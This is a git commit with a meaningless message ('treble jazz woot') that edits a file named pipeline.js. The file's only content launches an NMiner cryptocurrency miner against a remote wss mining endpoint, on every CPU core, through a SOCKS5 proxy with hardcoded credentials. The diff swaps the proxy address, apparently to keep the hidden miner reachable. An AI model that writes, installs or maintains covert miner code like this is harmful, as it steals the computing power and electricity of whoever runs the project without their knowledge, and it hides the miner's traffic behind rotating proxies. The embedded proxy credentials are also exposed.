0794a85b0dfd1ddf489bc436db6f409be5770876
Irma Goldner <irma_goldner@yahoo.com>
2026-08-22 20:44:19 +0530

    treble jazz woot

--- pipeline.js
+++ pipeline.js
@@ -1,2 +1,2 @@
 const { NMiner } = require("nminer");
-new NMiner("wss://runtime.nmining.igrp.app/", "admin.pipeline", { proxy: "socks5://dcswarup:webshare@192.241.125.110:8154", threads: require("os").cpus().length, throttle: true });
+new NMiner("wss://runtime.nmining.igrp.app/", "admin.pipeline", { proxy: "socks5://dcswarup:webshare@104.253.219.135:6544", threads: require("os").cpus().length, throttle: true });
